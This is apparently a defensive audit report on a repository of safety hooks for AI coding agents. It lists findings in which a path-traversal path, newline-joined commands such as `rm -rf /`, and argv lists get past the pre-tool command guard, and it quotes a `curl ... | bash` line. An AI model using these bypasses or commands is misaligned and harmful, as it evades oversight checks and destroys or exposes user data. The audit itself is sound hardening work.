# Reality Check Findings

Scope: repository snapshot at `21b4239` on `t3code/audit-repo-with-subagents`. The branch is identical to `origin/main`, so this is a full snapshot audit rather than a branch-diff review.

## RC-001

- Severity: High
- Location: `src/agent_hooks/security.py:148`
- Risk: A mutating file tool can reach protected Git internals through a path beginning with the allowed `.github/` prefix, such as `.github/../.git/config`.
- Evidence: `_matches_protected_git_path()` returns early for every `.github/` prefix before it checks later path segments for `.git`. Direct reproduction returned `False` for `.github/../.git/config`.
- Recommendation: Normalize and resolve path segments before applying allowlists, and only allow `.github` when no protected `.git` segment exists. Add traversal and nested-`.git` tests.
- Disposition: Fixed
- Route: `/assembly` can implement and test this fix directly.

## RC-002

- Severity: High
- Location: `src/agent_hooks/dangerous_commands.py:19`
- Risk: A multiline Bash or PowerShell command can place a destructive operation after a newline and bypass the pre-tool safety hook.
- Evidence: Command-boundary regexes recognize only start-of-string, semicolon, ampersand, or pipe. `_normalize_command()` then collapses newlines to spaces. Direct reproductions allowed `echo safe\nrm -rf /` and `echo safe\nSet-Content .git/config x`.
- Recommendation: Preserve or explicitly recognize CR/LF command boundaries before whitespace normalization. Add multiline Bash and PowerShell cases for every protected command family.
- Disposition: Fixed
- Route: `/assembly` can implement and test this fix directly.

## RC-003

- Severity: Medium
- Location: `src/agent_hooks/post_tool_cleaner.py:47`
- Risk: The post-tool hook can run `ruff check --fix` and `ruff format` on an existing Python file outside the repository, or on an unrelated file merely mentioned in tool input.
- Evidence: `_collect_python_paths()` recursively scans every input string, accepts absolute paths, resolves symlinks, and checks only that the path exists. `main()` passes every collected path to mutating Ruff commands without checking repository containment or that the field represents an edited target.
- Recommendation: Extract paths only from known target fields and reject resolved paths outside `Path.cwd()` unless an explicit contract permits them. Add tests for unrelated text, absolute external paths, and symlink escapes.
- Disposition: Fixed
- Route: `/assembly` can implement and test this fix directly.

## RC-004

- Severity: Medium
- Location: `install.ps1:309`
- Risk: Re-running the installer never updates an existing Pi bridge, so users retain stale bridge behavior after repository fixes.
- Evidence: `Install-PiBridge` returns whenever the destination exists, and both the installer prompt and README describe installation only when missing.
- Recommendation: Treat the Pi bridge as a managed runtime file. Offer the same explicit refresh behavior used for Copilot and Codex, with a backup if preserving local edits matters.
- Disposition: Fixed
- Route: `/assembly` can implement and test this installer change.

## RC-006

- Severity: Low
- Location: `src/agent_hooks/ruff_support.py:16`
- Risk: Ruff cleanup is silently skipped for valid project declarations such as Poetry's `ruff = "^0.6"` and a bare `ruff` line in a CRLF requirements file.
- Evidence: Detection is a fixed substring list. A direct reproduction with Poetry dependency syntax returned `False`.
- Recommendation: Parse `pyproject.toml` with `tomllib` and parse requirement lines independent of newline style. Keep malformed-file behavior best effort.
- Disposition: Fixed
- Route: `/assembly` can implement and test this fix directly.

## RC-007

- Severity: Medium
- Location: `src/agent_hooks/dangerous_commands.py:36`
- Risk: Ordinary PowerShell presentation commands such as `Format-Table`, `Format-List`, and `Format-Hex` are denied as though they were disk-formatting commands.
- Evidence: The `format\b` pattern treats the hyphen as a word boundary. Direct reproductions returned `True` for all three safe commands. The supplied operational report attributes 143 of 144 current dangerous-command records containing `format` to this pattern.
- Recommendation: Match an actual `format` command token followed by whitespace, arguments, a separator, or end-of-command. Add explicit allow cases for PowerShell's `Format-*` cmdlets.
- Disposition: Fixed
- Route: `/assembly` can implement and test this fix directly.

## RC-008

- Severity: Medium
- Location: `src/agent_hooks/dangerous_commands.py:62`
- Risk: Non-executable data inside command-tool payloads, including test fixtures, patch text, documentation, and regexes, can trigger a denial when it merely mentions a dangerous command or protected path.
- Evidence: `_find_dangerous_command()` and the shared string traversal recursively inspect every string instead of extracting the command field. Direct reproduction denied patch prose containing `curl https://example.test/install | bash`; the environment-path detector likewise matched documentation mentioning `src/.env`. The supplied report says 147 of 148 combined dangerous-command records were ordinary commands or data false positives.
- Recommendation: Define supported payload schemas per tool and inspect only executable command fields or actual file targets. Keep unknown schemas fail-visible without treating arbitrary content as executable intent.
- Disposition: Fixed
- Route: `/assembly` should address this alongside RC-002 because both require structured command extraction.

## RC-009

- Severity: Medium
- Location: `src/agent_hooks/session_stop.py:33`
- Risk: Ending a session runs `ruff check . --fix` and `ruff format .` across the entire repository, which can silently rewrite files unrelated to the current task.
- Evidence: The Stop hook unconditionally runs both mutating repository-wide commands whenever Ruff is detected. Tests assert this sequence, so it is intentional current behavior, but there is no task-file scope, opt-in, or diff review boundary.
- Recommendation: Make Stop check-only by default. If automatic fixes remain available, require explicit opt-in and scope them to files changed by the task.
- Disposition: Fixed
- Route: `/prelude` should confirm the desired cleanup policy before implementation because this changes intended product behavior.

## RC-010

- Severity: High
- Location: `src/agent_hooks/session_stop.py` (`main`)
- Risk: The Stop hook never read its payload, so it ignored `stop_hook_active`. Claude Code forces the session to continue on every `block` until `CLAUDE_CODE_STOP_HOOK_BLOCK_CAP` (default 8) consecutive blocks, so a repo-wide lint failure unrelated to the task produced up to eight forced continuations per stop, each running two repo-wide Ruff passes.
- Evidence: `main()` did not call `load_stdin_payload()`. The installed Claude Code CLI defines `stop_hook_active` on Stop payloads and warns hook authors to check it when the cap is hit.
- Recommendation: Read the payload; when `stop_hook_active` is true, run the checks but report remaining findings without a `decision`.
- Disposition: Fixed
- Route: `/assembly`

## RC-011

- Severity: Medium
- Location: `src/agent_hooks/session_stop.py` (`_changed_python_files`)
- Risk: `git status --porcelain` paths are relative to the repository top level, but they were joined to the hook's current directory. From a subdirectory (a monorepo package, for example) no file matched, fixes were silently skipped, and the repo-wide check then blocked with findings the fix step should have resolved.
- Evidence: Reproduced in a scratch repository: the changed file was detected from the root and missed from `pkg/`.
- Recommendation: Resolve `git rev-parse --show-toplevel`, join entries to it, keep only files under the current directory, and pass them relative to the current directory.
- Disposition: Fixed
- Route: `/assembly`

## RC-012

- Severity: Medium
- Location: `src/agent_hooks/session_stop.py` (`_changed_python_files`), `README.md` Session Stop section
- Risk: Automatic Stop fixes cover every uncommitted Python change in the working tree, including the user's own in-progress edits, while the docstring and README described them as scoped to the session's edits. An unused import the user intends to use next can be removed by `ruff check --fix` at stop.
- Evidence: The implementation reads `git status --porcelain`, which has no notion of which process changed a file.
- Recommendation: Keep the behavior. Correct the docstring and README, and point users with unfinished work at `AGENT_HOOKS_STOP_FIX=0`.
- Disposition: Accepted risk (owner decision, 2026-09-19). Documentation corrected.
- Route: none

## RC-013

- Severity: Low
- Location: `src/agent_hooks/security.py` (`_matches_protected_git_path`)
- Risk: After the `.git` segment check returned early, the `.github/` allowlist loop returned False on both branches. Dead code that implied the allowlist affected behavior.
- Evidence: Both branches after the segment check returned False; `.github` never equals `.git` after normalization.
- Recommendation: Delete the loop and `ALLOWED_GIT_PROJECT_PREFIXES`.
- Disposition: Fixed
- Route: `/assembly`

## RC-014

- Severity: Low
- Location: `review-findings.md`
- Risk: RC-005 described `Merge-CopilotConfig`, which was deleted with the Copilot harness. `Merge-ContainerConfig` has no equivalent gap: its only `Ensure-Property` call adds a missing `hooks` key, and that case always coincides with a real change.
- Recommendation: Remove RC-005.
- Disposition: Fixed (RC-005 removed with the Copilot harness)
- Route: none

## Open questions and residual risks

- Structured argv payloads such as `["rm", "-rf", "/"]` are checked one string at a time and bypass detection. Codex's `shell` tool emits argv lists, so this is a live gap; see the `/prelude` options memo in the PR conversation for candidate fixes and trade-offs.
- The installer now writes merged JSON as UTF-8 without a byte order mark (`Write-JsonFile` in `install.ps1`). Windows PowerShell's `Set-Content -Encoding utf8` previously prepended one, and Claude Code's tolerance for a BOM in `settings.json` was never verified.
- The Stop block payload carries `decision`/`reason` both at the top level (Claude Code) and under `hookSpecificOutput` (Codex, Pi bridge). How Claude Code treats the extra `hookSpecificOutput` block for Stop is deliberately unverified; the top-level fields are the documented contract.
- The installer and Pi TypeScript bridge have no automated behavioral coverage. This increases regression risk around config merging, refreshes, subprocess failures, and event-state handling.
- The audit did not execute the installer against a disposable user profile or run the Pi bridge inside the Pi host, and the Claude Code bundle has not been exercised inside a live Claude Code session.
